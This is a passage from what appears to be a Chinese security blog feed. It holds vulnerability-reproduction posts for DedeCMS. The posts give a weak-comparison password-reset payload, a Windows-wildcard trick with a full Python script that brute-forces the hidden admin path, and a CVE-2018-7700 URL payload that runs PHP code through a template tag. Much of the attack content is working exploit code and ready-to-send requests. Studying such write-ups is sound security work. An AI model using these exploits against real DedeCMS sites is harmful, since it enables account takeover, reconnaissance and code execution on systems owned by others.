class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;GetOne(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safequestion</span>)) <span class="variable">$safequestion</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safeanswer</span>)) <span class="variable">$safeanswer</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;safequestion&#x27;</span>] == <span class="variable">$safequestion</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;safeanswer&#x27;</span>] == <span class="variable">$safeanswer</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sn(<span class="variable">$mid</span>, <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>], <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&#x27;N&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里逻辑比较简单，首先获取一个 id 赋值给 <code>$mid</code> ，这个 id 我们可以直接 POST，之后就是使用的 sql 语句，得到数据库中存储的内容，我们来看看 dede_member 内容</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210628214408.png"></p><p>可能有师傅会奇怪这个表不是 <code>#@__member</code> 么，怎么变成 dede_member 了，这是因为这个 sql 语句执行前会进行一些操作，数据库中就是 dede_member ，当然也有可能是其他的前缀，位于 <code>include/dedesql.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetQuery</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$prefix</span>=<span class="string">&quot;#@__&quot;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = str_replace(<span class="variable">$prefix</span>,<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_dbprefix&#x27;</span>],<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;queryString = <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上图，我们可以知道，没有设置密保的用户，他们数据库中的值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;safequestion&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;safeanswer&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们继续看之前的代码，我们传进来的代码会先判空，如果是空，那么就设置成空字符，我们需要传进来的值与上面数据库中取值相等就可以重置密码，如果我们这样传值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safequestion</span>=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="variable">$safeanswer</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们会发现不符合条件，因为 empty(0) 为真，空是空，0也是空，全部会置空，就没法匹配到 0，那我们要怎么做呢，这里可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safequestion</span>=<span class="string">&#x27;00&#x27;</span></span><br><span class="line"><span class="variable">$safeanswer</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>因为后面的比较是两个等号，也就是弱比较 ，’00’ 可以等于 ‘0’ ，’0.0’ 也可以等于 ‘0’</p><p>最后传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost&#x3D;safequestion&amp;id&#x3D;2&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞只需要存在没有设置密保问题的用户就行，直接 post id就可以，用户名会直接在修改密码中取出来，还是比较好的，唯一的缺点就是只能更改 member 中的 admin 账户密码，没法利用这个登陆到后台</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/">https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 密码修改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 后台地址泄露漏洞</title>
      <link href="2021/06/28/DedeCMS-%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/06/28/DedeCMS-%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。dedecms 默认后台地址为 /dede，但很多时候可能会被管理员更改，这时，我们就需要先找到后台地址，本漏洞可以泄露出 dedecms 的后台。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>仅针对windows系统（这是因为 &lt; 通配符只在 windows 生效），猜测影响全版本</p><p>测试版本 DedeCMS V5.7 SP2</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>问题出在 include/common.inc.php 的 148 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/uploadsafe.inc.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传文件时会请求 include/uploadsafe.inc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$keyarr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;tmp_name&#x27;</span>, <span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keyarr</span> <span class="keyword">as</span> <span class="variable">$k</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="variable">$k</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Request Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( preg_match(<span class="string">&#x27;#^(cfg_|GLOBALS)#&#x27;</span>, <span class="variable">$_key</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow for uploadsafe!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$_key</span> = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125; = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_type&#x27;</span>&#125; = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;type&#x27;</span>] = preg_replace(<span class="string">&#x27;#[^0-9a-z\./]#i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line">    $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_size&#x27;</span>&#125; = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;size&#x27;</span>] = preg_replace(<span class="string">&#x27;#[^0-9]#&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;size&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="string">&quot;#\.(&quot;</span>.<span class="variable">$cfg_not_allowall</span>.<span class="string">&quot;)$#i&quot;</span>,$&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="string">&quot;#\.#&quot;</span>, $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!defined(<span class="string">&#x27;DEDEADMIN&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_size&#x27;</span>&#125;))</span><br><span class="line">    &#123;</span><br><span class="line">        $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_size&#x27;</span>&#125; = @filesize(<span class="variable">$$_key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$imtypes</span> = <span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;image/pjpeg&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, </span><br><span class="line">        <span class="string">&quot;image/xpng&quot;</span>, <span class="string">&quot;image/wbmp&quot;</span>, <span class="string">&quot;image/bmp&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array(strtolower(trim($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_type&#x27;</span>&#125;)), <span class="variable">$imtypes</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$image_dd</span> = @getimagesize(<span class="variable">$$_key</span>);</span><br><span class="line">        <span class="comment">//问题就出在此处，获取不到就会报错退出</span></span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$image_dd</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Upload filetype not allow !&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会解析 <code>$_FILES</code> 的值，需要满足 <code>$_FILES[$key]</code> 一定要存在数组 <code>$keyarr</code>  中的这些键</p><p>然后就是不允许 <code>$key</code> 等于 cfg_ 或者 GLOBALS，这里防止了一部分的变量覆盖，因为之后就会 <code>$$key</code></p><p>接下来就是一些取值，比较简单，然后给了一个文件类型的白名单，必须满足是这些类型，最后来到出问题的位置，获取图片的大小，获取不到就报错，这里的话，由于 <code>$_FILES</code> 的值可控，也就是 <code>$$key</code> 的值可控，既然文件名可控，那么我们就可以利用这里判断是不是存在某文件，再利用通配符，我们就可以获取到后台的地址 </p><h3 id="PHP在Windows上的一些奇妙特性"><a href="#PHP在Windows上的一些奇妙特性" class="headerlink" title="PHP在Windows上的一些奇妙特性"></a>PHP在Windows上的一些奇妙特性</h3><p>这里我们需要了解一下 php 在windows上的一些奇妙特性 <a href="https://www.cnblogs.com/wangtanzhi/p/12868197.html">WINDOWS文件通配符分析</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大于号(&gt;)相等于通配符问号(?)</span><br><span class="line">小于号(&lt;)相当于通配符星号(*)</span><br><span class="line">双引号(&quot;)相当于点字符(.)</span><br></pre></td></tr></table></figure><p>首先我们需要知道我们使用了文件操作函数，然后PHP的文件操作函数均调用了opendir</p><p><code>opendir(win32readdir.c)</code> 使用了 <code>windows</code> 的 <code>FindFirstFile（API)</code> ，然后在FindFirstFile（API)中进行了如下的定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;  The following constants provide addition meta characters to fully</span><br><span class="line">&#x2F;&#x2F;  support the more obscure aspects of DOS wild card processing.</span><br><span class="line"></span><br><span class="line">#define DOS_STAR        (L&#39;&lt;&#39;)</span><br><span class="line">#define DOS_QM          (L&#39;&gt;&#39;)</span><br><span class="line">#define DOS_DOT         (L&#39;&quot;&#39;)</span><br></pre></td></tr></table></figure><p>于是我们的这三个符号在对php文件操作时就有了特殊含义</p><p>我们的这里使用了 getimagesize 函数，刚好他是文件操作，我们我们可以使用通配符 &lt;</p><p>很多地方说的都是 &lt; 只通配一个字符，但实际尝试中却是可以通配多个字符</p><h3 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h3><p>只要包含了 include/common.inc.php 的文件就可以被利用，没有其他特殊条件，这里我们可以选取 tags.php</p><p>在前面的文章中说过，每一个 GET 或者 POST 的参数都会进行如下处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">        <span class="keyword">else</span> $&#123;<span class="variable">$_k</span>&#125; = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们的 <code>$_FILES</code> 也可以通过这种形式来获取，POST 一个 <code>_FILES[a][tmp_name]</code> 就可以实现</p><p>这里还有一个简单的绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="string">&quot;#\.(&quot;</span>.<span class="variable">$cfg_not_allowall</span>.<span class="string">&quot;)$#i&quot;</span>,$&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="string">&quot;#\.#&quot;</span>, $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!defined(<span class="string">&#x27;DEDEADMIN&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这里必然是没有定义 DEDEADMIN 的，因此我们需要绕过，最简单的就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[a][name]=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>因此我们可以构造 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_FILES[a][tmp_name]&#x3D;.&#x2F;de&lt;&#x2F;images&#x2F;image.gif&amp;_FILES[a][name]&#x3D;&amp;_FILES[a][type]&#x3D;image&#x2F;gif&amp;_FILES[a][size]&#x3D;10</span><br></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>如果通配符只匹配一个字符，但刚好有文件夹的第一个字符与后台地址的第一个字符相同，那么将得不到结果，所以最好是先确定两个字符，因为只针对 windows，windows大小写不敏感，所以只需要小写字母+数字就行，图片文件需要是真实存在的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;_FILES[a][tmp_name]&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;_FILES[a][name]&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_FILES[a][type]&#x27;</span>: <span class="string">&#x27;image/gif&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_FILES[a][size]&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdmin</span>(<span class="params">url</span>):</span></span><br><span class="line">    dic = string.digits + string.ascii_lowercase</span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&#x27;./&#x27;</span> + i + j + <span class="string">&#x27;&lt;/images/image.gif&#x27;</span></span><br><span class="line">            data = getData(payload)</span><br><span class="line">            html = s.post(url + <span class="string">&#x27;/tags.php&#x27;</span>, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Upload filetype not allow !&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">                path = i + j</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot;/&quot;</span> + path)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&#x27;./&#x27;</span> + path + i + <span class="string">&#x27;&lt;/images/image.gif&#x27;</span></span><br><span class="line">            data = getData(payload)</span><br><span class="line">            html = s.post(url + <span class="string">&#x27;/tags.php&#x27;</span>, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Upload filetype not allow !&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">                path = path + i</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot;/&quot;</span> + path)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> s.get(url + <span class="string">&#x27;/&#x27;</span> + path + <span class="string">&#x27;/images/image.gif&#x27;</span>).status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dedecms&#x27;</span></span><br><span class="line">    getAdmin(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS V5.7 后台代码执行漏洞（CVE-2018-7700）</title>
      <link href="2021/06/27/DedeCMS-V5-7-%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7700%EF%BC%89/"/>
      <url>2021/06/27/DedeCMS-V5-7-%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7700%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。该漏洞的触发文件为 /dede/tag_test_action.php。起因是 csrf_check() 函数的绕过，导致登陆后。可执行任意代码。</p><h2 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h2><p>CVE-2018-7700</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7</p><p>DedeCMS V5.7 SP2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试版本为 5.7 SP2，描述中的 csrf_check 没有去验证，据说是因为登陆的时候不会生成 <code>$_SESSION[&#39;token&#39;]</code> ，因此登陆之后直接将 token 置空即可绕过，但我这里并没有觉得需要绕过这里，登陆后可以直接从其他地方获取 token ，这里主要关注代码执行漏洞。</p><p>还是一样，先获取一个 token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?action&#x3D;upload</span><br></pre></td></tr></table></figure><p>然后就可以代码执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tag_test_action.php?token&#x3D;05e0a0ab271dd01fd277c139a02940b6&amp;partcode&#x3D;&#123;dede:field name&#x3D;&#39;source&#39; runphp&#x3D;&#39;yes&#39;&#125;phpinfo();&#123;&#x2F;dede:field&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>我们先来到 dede/tag_test_action.php ，选取一些比较重要的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/config.php&quot;</span>);</span><br><span class="line">CheckPurview(<span class="string">&#x27;temp_Test&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(DEDEINC.<span class="string">&quot;/arc.partview.class.php&quot;</span>);</span><br><span class="line">csrf_check();</span><br><span class="line">...</span><br><span class="line"><span class="variable">$partcode</span> = stripslashes(<span class="variable">$partcode</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$typeid</span>)) <span class="variable">$typeid</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$showsource</span>)) <span class="variable">$showsource</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$typeid</span>&gt;<span class="number">0</span>) <span class="variable">$pv</span> = <span class="keyword">new</span> PartView(<span class="variable">$typeid</span>);</span><br><span 